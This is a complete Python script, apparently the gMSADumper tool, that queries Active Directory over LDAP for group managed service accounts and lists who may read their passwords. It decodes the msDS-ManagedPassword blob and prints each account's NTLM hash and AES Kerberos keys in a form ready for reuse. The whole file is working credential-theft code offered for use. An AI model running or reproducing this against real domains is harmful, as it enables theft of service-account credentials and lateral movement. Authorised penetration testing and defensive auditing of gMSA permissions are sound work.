#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
import argparse
from binascii import hexlify
from Cryptodome.Hash import MD4
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
import sys

parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
parser.add_argument('-u','--username', help='username for LDAP', required=False)
parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=False)
parser.add_argument('-k','--kerberos', help='use kerberos authentication',required=False, action='store_true')
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]

def main():
    args = parser.parse_args()

    if args.kerberos and (args.username or args.password):
        print("-k and -u|-p options are mutually exclusive")
        sys.exit(-1)
    if args.password and not args.username:
        print("specify a username or use -k for kerberos authentication")
        sys.exit(-1)
    if args.username and not args.password:
        print("specify a password or use -k for kerberos authentication")
        sys.exit(-1)    

    if args.ldapserver:
        server = Server(args.ldapserver, get_info=ALL)
    else:
        server = Server(args.domain, get_info=ALL)

    if not args.kerberos:
        conn = Connection(server, user='{}\\{}'.format(args.domain, args.username), password=args.password, authentication=NTLM, auto_bind=True)
    else:
        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)

    ldaps = False
    try:
        conn.start_tls()
        ldaps = True
    except:
        print('Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.\n')

    if ldaps:
        success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
    else:
        success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-GroupMSAMembership'])
    
    if success:
        if len(conn.entries) == 0:
            print('No gMSAs returned.')
        for entry in conn.entries:
                sam = entry['sAMAccountName'].value
                print('Users or groups who can read password for '+sam+':')
                for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
                    conn.search(base_creator(args.domain), '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])
                    
                    # Added this check to prevent an error from occuring when there are no results returned
                    if len(conn.entries) != 0:
                        print(' > ' + conn.entries[0]['sAMAccountName'].value)

                if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                    data = entry['msDS-ManagedPassword'].raw_values[0]
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob['CurrentPassword'][:-2]

                    # Compute ntlm key
                    ntlm_hash = MD4.new ()
                    ntlm_hash.update (currentPassword)
                    passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                    userpass = sam + ':::' + passwd
                    print(userpass)

                    # Compute aes keys
                    password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
                    salt = '%shost%s.%s' % (args.domain.upper(), sam[:-1], args.domain.lower())
                    aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
                    aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
                    print('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
                    print('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
    else:
        print('LDAP query failed.')
        print(success)

if __name__ == "__main__":
    main()
